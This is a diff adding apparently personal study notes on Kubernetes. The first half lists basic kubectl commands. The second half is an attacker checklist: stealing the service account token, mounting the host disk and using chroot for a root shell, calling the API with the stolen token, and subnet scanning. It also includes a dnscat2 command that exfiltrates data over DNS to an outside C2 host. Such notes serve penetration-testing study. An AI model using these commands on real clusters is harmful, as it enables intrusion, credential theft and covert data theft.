@@ -1,0 +1,241 @@
+
+-------------------------------------------------------------------------------------------------------------------------------------
+   _____              .___          __                        /\                
+  /     \ _______     |   |  ____ _/  |_   ____ _______   ____\(  ______        
+ /  \ /  \\_  __ \    |   | /    \\   __\_/ __ \\_  __ \ /    \  /  ___/        
+/    Y    \|  | \/    |   ||   |  \|  |  \  ___/ |  | \/|   |  \ \___ \         
+\____|__  /|__|       |___||___|  /|__|   \___  >|__|   |___|  //____  >        
+        \/                      \/            \/             \/      \/         
+                                                                                
+ ____  __.  ______    _________                                                 
+|    |/ _| /  __  \  /   _____/                                                 
+|      <   >      <  \_____  \                                                  
+|    |  \ /   --   \ /        \                                                 
+|____|__ \\______  //_______  /                                                 
+        \/       \/         \/                                                  
+                                                                                
+        .__                      __               .__                     __    
+  ____  |  |__    ____  _____  _/  |_       ______|  |__    ____   ____ _/  |_  
+_/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\ 
+\  \___ |   Y  \\  ___/  / __ \_|  |       \___ \ |   Y  \\  ___/\  ___/ |  |   
+ \___  >|___|  / \___  >(____  /|__|      /____  >|___|  / \___  >\___  >|__|   
+     \/      \/      \/      \/                \/      \/      \/     \/        
+                                             
+                                             
+------------------------------------------------------------------------------------------------------------------------------------
+                                         important files and dirs
+------------------------------------------------------------------------------------------------------------------------------------                                           
+                                             
+- /var/run/secrets/kubernetes.io/serviceaccount/token
+      - (service account token mounted inside container)
+      
+
+------------------------------------------------------------------------------------------------------------------------------------
+                                          commands i've run
+------------------------------------------------------------------------------------------------------------------------------------
+
+- minikube version
+- minikube start
+- kubectl version
+- kubectl cluster-info
+- kubectl get nodes
+- kubectl get pods
+
+- kubectl create deployment <deployment-name> --image=gcr.io/google-samples/kubernetes-bootcamp:v1
+- kubectl get deployments
+- kubectl proxy
+   - curl http://localhost:8001/api/v1/namespaces/default/pods/$POD_NAME/
+
+- kubectl describe pods
+- kubectl proxy
+   - curl http://localhost:8001/api/v1/namespaces/default/pods/$POD_NAME/proxy/
+- kubectl logs <POD-NAME> -c <CONTAINER-NAME>
+- kubectl exec <POD-NAME> -- env
+- kubectl exec <POD-NAME> -ti -- bash
+   - (-ti ensures we get an interactive shell)
+   
+- kubectl expose deployment/<DEPLOYMENT-NAME> --type="NodePort" --port 8080
+- kubectl get services
+- kubectl describe services
+- kubectl describe services/<SERVICE-NAME>
+- curl <NODE-IP>:<NODE-PORT>
+
+- kubectl get pods -l="<LABEL-NAME>"
+- kubectl label <OBJECT-TYPE> <OBJECT-NAME> <NEW-LABEL>
+- kubectl label pods $POD_NAME version=v1
+- kubectl delete service -l app=kubernetes-bootcamp
+
+- kubectl get rs
+      - (get ReplicaSet)
+- kubectl scale deployments/kubernetes-bootcamp --replicas=4
+      - (for a given deployment, increases # of replicas)
+- kubectl get pods -o wide
+      - (displays pod ip, node ip)
+      
+- kubectl set image deployments/<DEPLOYMENT-NAME> <DEPLOYMENT-NAME>=<CONTAINER-IMAGE-NAME>:<VERSION>
+- kubectl set image deployments/kubernetes-bootcamp kubernetes-bootcamp=jocatlin/kubernetes-bootcamp:v2
+      - (update deployment to new image)
+- kubectl rollout status deployments/<DEPLOYMENT-NAME>
+- kubectl rollout undo deployments/kubernetes-bootcamp
+      - (rollback the deployment to previous working version)
+      
+- kubectl get pods --all-namespaces
+
+------------------------------------------------------------------------------------------------------------------------------------
+                                          commands i've run (inside container)
+------------------------------------------------------------------------------------------------------------------------------------
+
+- curl localhost:8080
+   - (from inside a nodeJS pod, we query the nodeJS server)
+- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+   - (view service account token!)
+  
+------------------------------------------------------------------------------------------------------------------------------------
+                                            known ports
+------------------------------------------------------------------------------------------------------------------------------------
+
+8001 - kubeproxy
+      - is this specific to minikube?
+
+8443 - control planel / kube-api 
+      - is this specific to minikube?
+
+  
+  
+------------------------------------------------------------------------------------------------------------------------------------
+                                            random k8s facts
+------------------------------------------------------------------------------------------------------------------------------------
+- pods running inside kubernetes are isolated in a private cluster-wide network, unless intentionally exposed via a Service
+- if you wish to interact with the cluster directly (not via api), run kubectl proxy
+- anything that the application would normally send to STDOUT becomes logs for the container within the Pod
+      - View these with "kubectl logs"
+- Services expose apps. They do this via ClusterIp, NodePort, LoadBalancer, or ExternalName
+   - source: https://kubernetes.io/docs/tutorials/kubernetes-basics/expose/expose-intro/
+- An app exposed using NodePort can be accessed at <node-port>:<node-ip>
+- you may delete a service, but the app lives on inside the cluster.
+- in k8s, users don't have their own unique form of authentication. However, any user that presents a valid certificate signed by the 
+   cluster's certificate authority (CA) is considered authenticated
+
+- system:unauthenticated is the group that controls anonymous access
+
+ 7 k8s secrets, ian coldwater, brad geesaman  
+- no way to revoke compromised ca certs. Just gotta delete all and redistribute (taking down the cluster)
+- certificate pairs that are part of system:masters group are UNDELETABLE, and have full cluster access
+- DNS is a very effective way to esablish communications with your c2 server in k8s! 
+      - even if they don't want to, k8s admins are forced to let DNS traffic flow freely (bc the cluster needs it)
+      - this bypasses the egress filter!
+      - amazing for exfiltration
+
+   
+  
+------------------------------------------------------------------------------------------------------------------------------------
+                                            A k8s attacker should know how to...
+------------------------------------------------------------------------------------------------------------------------------------
+
+1. enumerating and abusing listening ports (AKA, break the perimiter)
+   → “Attackers - External Checklist" is perfect for this
+
+2. SA token Abuse
+   → The position of having a service account token is pretty huge... pretty common.
+
+3. Abusing create pod perms
+   → 
+
+4. Exfiltration
+   → DNS failiures
+
+
+Resources:
+
+- https://www.container-security.site/
+- https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes
+-----------------------------------------------------------------------------------------------------------------------------------
+
+- (foothold) exploit a vulnerable k8s service 
+
+- (foothold) exploit CVE's in a vulnerable webapp
+
+- (foothold) typosquatting in dockerhub 
+
+- (foothold) exploit an exposed dashboard
+      - could be k8s dashboard, or other
+
+- confirm that they are in a container
+      - look at the processes running...containers run few processes
+      - command: ps -aux
+      
+- mount host disk
+      - @10:25 https://www.youtube.com/watch?v=e1JQ3iZt76Q
+      - mount -l
+      - notice /dev on host is exposed (unusual for containers)
+      - mount /dev/xvda1 /mnt
+      - ls /mnt (now we're looking at host filesystem)
+      - chroot .
+      - = root shell on host.
+      
+      
+- steal SA token 
+   - cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+- curl request to api 
+      - requires SA token
+      - requires IP of kube-api
+      - format: /api/[version]/namespaces/[namespace]/[resource]/[name]
+      - example: https://10.27.240.1/api/v1/namespaces/default/endpoints
+      - full command 1: 
+         curl $APISERVER/api --header "Authorization: Bearer $TOKEN" --insecure
+      - full command 2: 
+         curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H \
+         "Authorization: Bearer $( cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
+          https://10.27.240.1/api/v1/namespaces/default/endpoints
+
+- curl request api /endpoints --> access publicly available IP Adresses using kubectl
+
+- access api using kubectl
+      - requires SA token
+      - requires ca.crt?
+
+- curl kubectl binary into a pod
+
+- enumerate permissions and vulns in a pod
+      - curl conmachi binary into pod (scans container for vulns)
+         - https://github.com/nccgroup/ConMachi
+      - kubectl auth can-i --list --token=$SA_TOKEN -n $NAMESPACE
+      - kubectl-access_matrix -n $NAMESPACE
+      - run amicontained tool
+      
+- deploy an "attack pod" 
+      - prolly should be your own attack image with your favorite tools 
+      - kubectl run -it myshell --image=busybox -n secure
+
+- enumerate pods and services (across namespaces) by scanning the subnet
+      - example: nmap -sS -p 5000 -PN -n --open 10.24.0.0/16
+
+- container escape via privileged pod
+      
+- escape namespace restrictions using port forwarding
+      - namespaces exist in k8s, but there are no networking boundaries
+      - socat can be used to 
+      - https://www.youtube.com/watch?v=cRbHILH4f0A&list=PLSGxDsVUZ-zwjE0X3Tk3IVzuRgzAkIXt4
+      - 32:40
+      - we can also use this tool: https://github.com/antitree/krew-net-forward
+
+- exfiltrate data from pod via DNS tunneling
+
+- 
+      - admins need to open outbound DNS traffic
+      - this takes advantage of that, for stealthy and unblockable exfiltration
+      - Demo @ 13:41
+      - https://www.youtube.com/watch?v=JBbVTmrZ45E&list=PLSGxDsVUZ-zwjE0X3Tk3IVzuRgzAkIXt4&index=3
+      
+- use dnscat2 as a c2 server for exfiltration
+      - https://github.com/iagox86/dnscat2
+      - udp port 53 (DNS)
+      - example: kubectl exec -it dns-exfil -- /bin/bash -c "dnscat c2.honk.sh --secret nosnooping --max-retransmits 10"
+
+https://www.container-security.site/attackers/compromised_user_credentials_checklist.html
+      - get cluster admin by abusing create daemonset + create pod rights.  
+      - create pod and exec into container
+      
+      
+      
